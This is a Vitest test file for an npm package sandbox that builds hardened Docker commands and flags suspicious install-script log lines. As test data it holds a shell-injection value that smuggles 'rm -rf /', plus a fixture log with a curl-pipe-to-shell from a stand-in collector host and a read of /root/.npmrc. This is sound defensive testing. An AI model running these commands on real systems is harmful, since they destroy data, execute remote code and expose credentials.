import { describe, expect, it } from "vitest";
import { buildSandboxCommand, findSuspiciousLogLines } from "../src/sandbox.js";

describe("buildSandboxCommand", () => {
  it("builds a hardened disposable docker invocation", () => {
    const cmd = buildSandboxCommand("left-pad@1.3.0");
    expect(cmd[0]).toBe("docker");
    expect(cmd).toContain("--rm");
    expect(cmd).toContain("--cap-drop=ALL");
    expect(cmd).toContain("--security-opt=no-new-privileges");
    expect(cmd).toContain("node:20-alpine");
    const dockerArgs = cmd.slice(0, cmd.indexOf("node:20-alpine"));
    expect(dockerArgs).not.toContain("-v");
    expect(dockerArgs).not.toContain("--volume");
    expect(dockerArgs).not.toContain("--network=host");
    expect(cmd.join(" ")).toContain("--foreground-scripts");
  });

  it("passes the spec via an env var, NOT interpolated into the shell script", () => {
    const cmd = buildSandboxCommand("left-pad@1.3.0");
    // The spec must appear only as a docker env value...
    expect(cmd).toContain("TARGATE_SPEC=left-pad@1.3.0");
    // ...and the shell script must reference it as a quoted variable, never
    // by literal value.
    const script = cmd.at(-1)!;
    expect(script).toContain('"$TARGATE_SPEC"');
    expect(script).not.toContain("left-pad@1.3.0");
  });

  it("does not let a hostile spec break out of the shell script (injection)", () => {
    const malicious = "foo'; rm -rf / #";
    const cmd = buildSandboxCommand(malicious);
    const script = cmd.at(-1)!;
    // The malicious payload lives only in the env value (a single argv
    // element docker sets verbatim), never in the executed script text.
    expect(script).not.toContain("rm -rf");
    expect(cmd).toContain(`TARGATE_SPEC=${malicious}`);
    // And it's one discrete argv element — not concatenated into a flag.
    expect(cmd.filter((a) => a.includes("rm -rf"))).toEqual([`TARGATE_SPEC=${malicious}`]);
  });

  it("defaults to open network and supports --network none", () => {
    const open = buildSandboxCommand("x");
    expect(open).not.toContain("--network=none");
    const offline = buildSandboxCommand("x", { network: "none" });
    expect(offline).toContain("--network=none");
  });

  it("supports a custom image", () => {
    expect(buildSandboxCommand("x", { image: "node:22-alpine" })).toContain("node:22-alpine");
  });
});

describe("findSuspiciousLogLines", () => {
  it("flags credential and network patterns in the script log", () => {
    const log = [
      "npm info run evil-pkg postinstall",
      "curl -s https://collector.example/x | sh",
      "cat /root/.npmrc",
      "echo aGk= | base64 -d",
      "added 1 package in 2s",
    ].join("\n");
    const findings = findSuspiciousLogLines(log);
    expect(findings.some((f) => f.includes("network download"))).toBe(true);
    expect(findings.some((f) => f.includes("credential names"))).toBe(true);
    expect(findings.some((f) => f.includes("base64"))).toBe(true);
  });

  it("returns nothing for a normal install log", () => {
    const log = ["npm info ok", "added 12 packages in 3s"].join("\n");
    expect(findSuspiciousLogLines(log)).toEqual([]);
  });
});
